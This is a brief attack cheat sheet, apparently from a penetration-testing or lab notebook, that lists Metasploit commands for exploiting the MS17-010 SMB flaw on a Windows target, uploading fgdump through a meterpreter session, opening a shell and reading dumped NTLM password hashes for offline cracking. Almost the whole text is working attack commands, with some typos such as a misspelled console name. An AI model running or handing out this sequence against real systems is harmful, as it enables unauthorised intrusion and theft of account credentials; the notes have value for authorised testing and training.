This assumes that the PC has the MS17 vulnerability:
```
mfsconsole
use windows/smb/ms17_010_psexec
show options
set RHOST <targetIP>
run
```

Exaple output:
![[Pasted image 20260428065813.png]]

download/transfer  fgdump to target PC.
run fgdump to get NTLM password hashes:
You can also upload and download files by using the "upload" and "download" commands

```
meterpreter > upload /root/Desktop/fgdump.exe C:\\Users\\Public\\Downloads\\fgdump.exe
```

open shell:
```
shell
```

Run fgdump, it will generate fump files with the NTLM hashes.
View the NTLM hashes:
```
type <fileName>
```


The NTLM Hashes can be used to crack on your local PC.